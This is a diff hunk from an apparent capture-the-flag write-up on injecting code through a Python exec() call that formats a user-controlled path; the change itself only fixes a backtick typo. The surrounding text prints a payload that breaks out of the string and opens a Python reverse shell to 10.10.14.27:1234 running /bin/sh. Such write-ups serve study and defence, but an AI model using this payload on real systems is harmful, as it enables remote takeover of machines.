@@ -302,7 +302,7 @@ exec(info.format(path)) # This is how you do string formatting, right?
 
 Since ```exec()``` executes python code passed to it, we have control over the path passed to the function.
 
-We find that we can complete the ```output = 'Document: {}'`` string and pass in code by passing a single quopte and a semicolon to create a valid python statement that is passed to exec. We have to end the expression with an extra semicolon in order for the expression to execute sucessfully since it is still appending the final single quote. Our path becomes:
+We find that we can complete the ```output = 'Document: {}'``` string and pass in code by passing a single quopte and a semicolon to create a valid python statement that is passed to exec. We have to end the expression with an extra semicolon in order for the expression to execute sucessfully since it is still appending the final single quote. Our path becomes:
 
 ```python
 ';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);;'
